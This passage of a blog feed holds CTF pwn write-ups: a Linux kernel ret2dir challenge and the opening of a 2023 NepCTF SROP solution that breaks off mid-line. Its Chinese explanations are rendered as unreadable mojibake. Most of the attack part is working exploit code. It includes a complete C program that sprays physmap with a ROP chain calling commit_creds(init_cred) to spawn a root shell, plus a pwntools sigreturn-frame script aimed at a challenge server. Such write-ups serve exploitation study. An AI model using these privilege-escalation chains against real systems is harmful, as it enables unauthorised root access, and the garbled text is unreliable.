class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸€ç³»åˆ—çš„pushåœ¨å†…æ ¸æ ˆä¸Šå½¢æˆä¸€ä¸ªpt_regsç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* arch/x86/include/asm/ptrace.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€æ§åˆ¶è¿™éƒ¨åˆ†å¯„å­˜å™¨å€¼ï¼Œä»è€Œæ§åˆ¶å†…æ ¸æ ˆä¸Šçš„å€¼ï¼Œç„¶åé€šè¿‡<code>add rsp,val,retå’Œpop rspï¼Œret</code>æ¥å®ç°æ ˆè¿ç§»</p><p>æœ¬é¢˜é‡Œé™¤r8ï¼Œr9å¯„å­˜å™¨å…¶ä½™éƒ½è¢«ç ´åäº†ï¼Œä¸è¿‡ä¸¤ä¸ªå¯„å­˜å™¨ä¹Ÿå¤Ÿäº†</p><p>å…ˆåˆ©ç”¨<code>add rsp,val,ret</code>æŠŠæ ˆé™åˆ°r9å¯„å­˜å™¨çš„ä½ç½®ï¼Œr9å¯„å­˜å™¨é‡Œå­˜æ”¾<code>pop rsp,ret</code>çš„gadgetï¼Œ<code>pop rsp</code>å®Œæˆæ ˆè¿ç§»åˆ°r8é‡Œçš„å€¼,retæ‰§è¡Œè¿ç§»å¤„çš„å†…å®¹ï¼Œæ‰€ä»¥r8é‡Œå°±å­˜çŒœæµ‹çš„physmapåœ°å€</p><p>ç”¨ä¸‹é¢çš„ä»£ç æµ‹è¯•ï¼Œæ–­ç‚¹æ–­åˆ°æœ€åæ‰§è¡Œ call __x86_indirect_thunk_rbxçš„ret</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    &quot;mov r15,   0xbeefdead;&quot;</span><br><span class="line">    &quot;mov r14,   0x11111111;&quot;</span><br><span class="line">    &quot;mov r13,   0x22222222;&quot;</span><br><span class="line">    &quot;mov r12,   0x33333333;&quot;</span><br><span class="line">    &quot;mov rbp,   0x44444444;&quot;</span><br><span class="line">    &quot;mov rbx,   0x55555555;&quot;</span><br><span class="line">    &quot;mov r11,   0x66666666;&quot;</span><br><span class="line">    &quot;mov r10,   0x77777777;&quot;</span><br><span class="line">    &quot;mov r9,    0x999999999;&quot;   </span><br><span class="line">    &quot;mov r8,    0x888888888;&quot;</span><br><span class="line">    &quot;mov rax,   0x10;&quot;</span><br><span class="line">    &quot;mov rcx,   0xaaaaaaaa;&quot;</span><br><span class="line">    &quot;mov rdx,   0x33;&quot;</span><br><span class="line">    &quot;mov rsi,   0x1bf52;&quot;</span><br><span class="line">    &quot;mov rdi,   fd;&quot;</span><br><span class="line">    &quot;syscall&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>__x86_indirect_thunk_rbxæœ€åå®ç°è°ƒç”¨</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230823153602727.png" alt="image-20230823153602727"></p></blockquote><p><img src="/2023/08/22/kernel-ret2dir/image-20230823153135353.png" alt="image-20230823153135353"></p><p>æ‰€ä»¥éœ€è¦add rsp, 0xc0ï¼Œæ‰¾åˆ°äº†ä¸€æ¡å¹³æ›¿çš„gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffffffff810737fe: add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span><br></pre></td></tr></table></figure><p>ç”±äºå¼€äº†ptiï¼Œææƒåè¿”å›ç”¨æˆ·æ€èµ·rootshellå‰éœ€è¦åˆ‡æ¢cr3</p><p>å†…æ ¸ç©ºé—´çš„PGDå’Œç”¨æˆ·ç©ºé—´çš„PGDè¿ç»­çš„æ”¾ç½®åœ¨ä¸€ä¸ª8KBçš„å†…å­˜ç©ºé—´ä¸­ï¼ˆå†…æ ¸æ€åœ¨ä½ä½ï¼Œç”¨æˆ·æ€åœ¨é«˜ä½ï¼‰ã€‚è¿™æ®µç©ºé—´å¿…é¡»æ˜¯8Kå¯¹é½çš„ï¼Œè¿™æ ·å°†CR3çš„åˆ‡æ¢æ“ä½œè½¬æ¢ä¸ºå°†CR3å€¼çš„ç¬¬13ä½(ç”±ä½åˆ°é«˜)çš„ç½®ä½æˆ–æ¸…é›¶æ“ä½œï¼Œæé«˜äº†CR3åˆ‡æ¢çš„é€Ÿåº¦ã€‚</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230823181758556.png" alt="image-20230823181758556"></p><p>åˆ‡æ¢åˆ°ç”¨æˆ·é¡µè¡¨æŠŠç¬¬13ä½ç½®1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SWITCH_USER_CR3</span><br><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, 1000h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰åˆé€‚gadgetæ¥åˆ©ç”¨</p><p>ç”±äºæ²¡å¼€kaslrï¼Œå¯ä»¥ç”¨swapgs_restore_regs_and_return_to_usermodeå‡½æ•°æ¥è¿”å›,è¿™é‡Œä»æ¢å¤çš„vmlinuxçœ‹çš„è¯ï¼Œvmlinuxåº”è¯¥æ˜¯æ¢å¤çš„æœ‰ç‚¹é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble swapgs_restore_regs_and_return_to_usermode                                                                                                                                                </span><br><span class="line">Dump of assembler code for function swapgs_restore_regs_and_return_to_usermode:    </span><br><span class="line">0xffffffff81c00fb0 &lt;+0&gt;:     nop    DWORD PTR [rax+rax*1+0x0] </span><br><span class="line">0xffffffff81c00fb5 &lt;+5&gt;:     pop    r15                    </span><br><span class="line">0xffffffff81c00fb7 &lt;+7&gt;:     pop    r14 </span><br><span class="line">0xffffffff81c00fb9 &lt;+9&gt;:     pop    r13     </span><br><span class="line">0xffffffff81c00fbb &lt;+11&gt;:    pop    r12</span><br><span class="line">0xffffffff81c00fbd &lt;+13&gt;:    pop    rbp</span><br><span class="line">0xffffffff81c00fbe &lt;+14&gt;:    pop    rbx</span><br><span class="line">0xffffffff81c00fbf &lt;+15&gt;:    pop    r11</span><br><span class="line">0xffffffff81c00fc1 &lt;+17&gt;:    pop    r10</span><br><span class="line">0xffffffff81c00fc3 &lt;+19&gt;:    pop    r9</span><br><span class="line">0xffffffff81c00fc5 &lt;+21&gt;:    pop    r8</span><br><span class="line">0xffffffff81c00fc7 &lt;+23&gt;:    pop    rax</span><br><span class="line">0xffffffff81c00fc8 &lt;+24&gt;:    pop    rcx</span><br><span class="line">0xffffffff81c00fc9 &lt;+25&gt;:    pop    rdx</span><br><span class="line">0xffffffff81c00fca &lt;+26&gt;:    pop    rsi;ç›´åˆ°è¿™é‡Œæ¢å¤ä¸€äº›å½“æ—¶ä¸­æ–­ä¿å­˜çš„pt_regså¯„å­˜å™¨ç»„</span><br><span class="line">0xffffffff81c00fcb &lt;+27&gt;:    mov    rdi,rsp;ä¸€èˆ¬è¿”å›ç”¨æˆ·æ€èµ·shllçš„ropç›´æ¥è¿”å›è¿™é‡Œå³å¯</span><br><span class="line">0xffffffff81c00fce &lt;+30&gt;:    mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81c00fd7 &lt;+39&gt;:    push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81c00fda &lt;+42&gt;:    push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81c00fdd &lt;+45&gt;:    push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81c00fe0 &lt;+48&gt;:    push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81c00fe3 &lt;+51&gt;:    push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81c00fe6 &lt;+54&gt;:    push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81c00fe8 &lt;+56&gt;:    push   rax</span><br><span class="line">0xffffffff81c00fe9 &lt;+57&gt;:    xchg   ax,ax</span><br><span class="line">0xffffffff81c00feb &lt;+59&gt;:    mov    rdi,cr3</span><br><span class="line">0xffffffff81c00fee &lt;+62&gt;:    jmp    0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;: or     rdi,0x1000;æ¢å¤ç”¨æˆ·æ€PGD</span><br><span class="line">0xffffffff81c0102b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;: mov    cr3,rdi</span><br><span class="line">0xffffffff81c0102e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;: pop    rax</span><br><span class="line">0xffffffff81c0102f &lt;swapgs_restore_regs_and_return_to_usermode+127&gt;: pop    rdi</span><br><span class="line">0xffffffff81c01030 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;: swapgs </span><br><span class="line">0xffffffff81c01033 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;: jmp    0xffffffff81c01060 &lt;native_iret&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01060 &lt;native_iret&gt;:    test   BYTE PTR [rsp+0x20],0x4;éœ€è¦ä¸ç›¸ç­‰ï¼Œä¸€èˆ¬æ»¡è¶³</span><br><span class="line">0xffffffff81c01065 &lt;native_iret+5&gt;:  jne    0xffffffff81c01069 &lt;native_irq_return_ldt&gt;</span><br><span class="line">0xffffffff81c01067 &lt;native_irq_return_iret&gt;: iretq</span><br></pre></td></tr></table></figure><p>åˆ‡æ¢äº†ç”¨æˆ·æ€çš„é¡µè¡¨å’Œgså¯„å­˜å™¨ï¼Œå¤špopäº†raxå’Œrdiï¼Œæ‰€ä»¥ææƒropé“¾å˜ä¸º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rsp  ----&gt;  swapgs_restore_regs_and_return_to_usermode::mov_rdi_rsp</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            get root shell</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure><p>physmapé‡Œæœ€åçš„å½¢å¼å°±æ˜¯ä¸‹é¢è¿™æ ·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">------------------------</span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret</span><br><span class="line">...</span><br><span class="line">add rsp, val ; ret # è¯¥gadgetå¿…å®šä¼šå‘½ä¸­ä¸‹ä¸€ä¸ªåŒºåŸŸä¸­çš„ä¸€æ¡retï¼Œä¹‹åä¾¿èƒ½å¹³ç¼“åœ°â€œæ»‘â€åˆ°å¸¸è§„çš„ææƒ rop ä¸Š</span><br><span class="line">------------------------</span><br><span class="line">ret</span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">ret</span><br><span class="line">------------------------</span><br><span class="line">common root ROP chain</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xc0 = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs = <span class="number">0xffffffff81c0129c</span>;</span><br><span class="line"><span class="type">size_t</span> iret_poprbp = <span class="number">0xffffffff8103ba65</span>;</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">constructROPChain</span><span class="params">(<span class="type">size_t</span> *rop)</span> &#123;</span><br><span class="line">  <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); idx++)</span><br><span class="line">    rop[idx] = add_rsp_0xc0;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); idx++)</span><br><span class="line">    rop[idx] = ret;</span><br><span class="line">  rop[idx++] = pop_rdi_ret;</span><br><span class="line">  rop[idx++] = init_cred;</span><br><span class="line">  rop[idx++] = commit_creds;</span><br><span class="line">  rop[idx++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = (<span class="type">size_t</span>)spawn_shell;</span><br><span class="line">  rop[idx++] = user_cs;</span><br><span class="line">  rop[idx++] = user_rflags;</span><br><span class="line">  rop[idx++] = user_sp;</span><br><span class="line">  rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_status();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open  error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">  physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  constructROPChain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">    physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                                MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!physmap_spray_arr[i]) &#123;</span><br><span class="line">      perror(<span class="string">&quot;Mmap Failed!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">  &#125;</span><br><span class="line">  guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">  __asm__(<span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov r8,    guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdx,   guess;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">          <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/22/kernel-ret2dir/image-20230828094130225.png" alt="image-20230828094130225"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/560805991">https://zhuanlan.zhihu.com/p/560805991</a></li><li><a href="https://zhuanlan.zhihu.com/p/137277724">https://zhuanlan.zhihu.com/p/137277724</a></li><li><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 NepCTF pwn</title>
      <link href="/2023/08/17/2023NepCTF/"/>
      <url>/2023/08/17/2023NepCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/srop&gt; checksec pwn</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/nepctf/srop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/srop&gt; seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>ç­¾åˆ°é¢˜ï¼Œsropæˆ–è€…ret2csuéƒ½èƒ½æ‰“</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">30523</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;0x04007AD&#x27;)</span></span><br><span class="line">buffer=elf.bss()</span><br><span class="line"><span class="comment"># 0x0000000000400813 : pop rdi ; ret</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400813</span></span><br><span class="line">syscall=elf.sym[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">readpaylaod = SigreturnFrame()</span><br><span class="line">readpaylaod.rdi=<span class="number">0</span></span><br><span class="line">readpaylaod.rsi=<span class="number">0</span></span><br><span class="line">readpaylaod.rdx=buffer</span><br><span class="line">readpaylaod.rcx=<span class="number">0x1000</span></span><br><span class="line">readpaylaod.rip=syscall</span><br><span class="line">readpaylaod.rsp =buffer+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">ropopen=SigreturnFrame()</span><br><span class="line">ropopen.rdi=<span class="number">2</span></span><br><span class="line">ropopen.rsi=buffer</span><br><span class="line">ropopen.rip=syscall</span><br><span class="line">ropopen.rsp =buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))+<span class="number">0x18</span></span><br><span class="line"></span><br><span 